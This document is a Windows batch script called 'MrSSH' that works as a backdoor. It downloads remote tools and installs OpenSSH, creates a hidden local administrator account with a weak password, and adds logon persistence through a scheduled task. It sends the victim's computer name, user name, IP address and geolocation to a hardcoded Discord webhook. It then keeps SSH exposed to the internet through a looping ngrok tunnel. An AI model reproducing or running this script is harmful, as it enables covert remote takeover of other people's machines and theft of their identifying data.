cd %temp%

curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1" -o "OpenSSH.ps1"
curl -Ls "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat" -o "source.bat"
curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" -o "SilentCMD.exe"
curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "ngrok.zip"
curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/NgrokRun.bat" -o "NgrokRun.bat"
curl -Ls "https://github.com/dh3b/MrSSH/raw/main/Files/WebParse.exe?raw=true" -o "WebParse.exe"

powershell ./OpenSSH.ps1

net user "Admin" "Administrator" /add
net localgroup Administrators Admin /add
net localgroup Administratorzy Admin /add
net localgroup Administración  Admin /add

mkdir %appdata%\MrSSH
cd %appdata%\MrSSH & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/onlogon.bat" -o "onlogon.bat" & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Silentlog.vbs" -o "Silent.vbs"
schtasks /create /tn "MrSSH" /sc onlogon /tr "%appdata%\MrSSH\Silent.vbs" /F
cd %temp%

set "webhook=https://discord.com/api/webhooks/893838978833350706/S6T93mD5c6dA6kMHIgWWzHPiFJH3rj2XqANwwvPn2nHmkJhEd6PPYJeNvO3qKCKG6xtK"

for /f "tokens=*" %%a in ('call "WebParse.exe" "http://ip-api.com/json/?fields=61439" query status city regionName country countryCode lat lon timezone isp') do set "%%a"

call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username%\\n\\n:house:**Ip address:** %query% (%isp%) \\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% (%countryCode%) \\n\\n:japan: **Region:** %regionName% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %timezone%" "52bf90" "https://i.imgur.com/b2Terft.png"

mkdir log
tar -xf ngrok.zip

start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
start /B "discordmsg" silentcmd %temp%\NgrokRun.bat /DELAY:10
start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400

:ngrokloop
call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
start /B "discordmsg" silentcmd NgrokRun.bat /DELAY:10
start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
goto ngrokloop
